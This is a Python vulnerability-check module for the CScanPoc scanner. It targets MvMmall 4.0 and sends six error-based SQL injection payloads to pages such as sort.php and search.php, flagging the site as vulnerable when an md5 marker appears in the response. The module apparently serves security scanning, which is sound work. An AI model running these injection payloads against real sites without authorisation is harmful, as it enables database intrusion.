# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'MvMmall_0002'  # 平台漏洞编号，留空
    name = 'MvMmall4.0 多处sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-04-10'  # 漏洞公布时间
    desc = '''
        MvMmall4.0 多处sql注入：
        /miaosha.php
        /sort.php?shop_name=
        /page.php?action=
        /board.php?ps_search=xxx
        /search.php?ps_search=xxx
        /shop.php?shop_name=xxx
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'MvMmall'  # 漏洞应用名称
    product_version = '4.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0966cc9d-8863-42f7-bc55-dcd4db506004'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payloads = [
                '/miaosha.php?action=&cat_uid=&brand_uid=30%20OR%20updatexml%281%2CCONCAT%280x7e%2Cmd5%280x22%29%29%2C0%29',
                '/sort.php?shop_name=%27or%20updatexml%281%2Cconcat%280x7e%2C%28md5%280x22%29%29%29%2C0%29or%27',
                '/page.php?action=%27or%20updatexml%281%2Cconcat%280x7e%2C%28md5%280x22%29%29%29%2C0%29or%27',
                '/board.php?ps_search=xxx%27or%20updatexml%281%2Cconcat%280x7e%2C%28md5%280x22%29%29%29%2C0%29or%27',
                '/search.php?ps_search=xxx%27or%20updatexml%281%2Cconcat%280x7e%2C%28md5%280x22%29%29%29%2C0%29or%27&sellshow=1',
                '/shop.php?shop_name=xxx%27or%20updatexml%281%2Cconcat%280x7e%2C%28md5%280x22%29%29%29%2C0%29%20or%27'
            ]
            for payload in payloads:
                verify_url = self.target + payload
                r = requests.get(verify_url)

                if 'b15835f133ff2e27c7cb28117bfae8f' in r.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
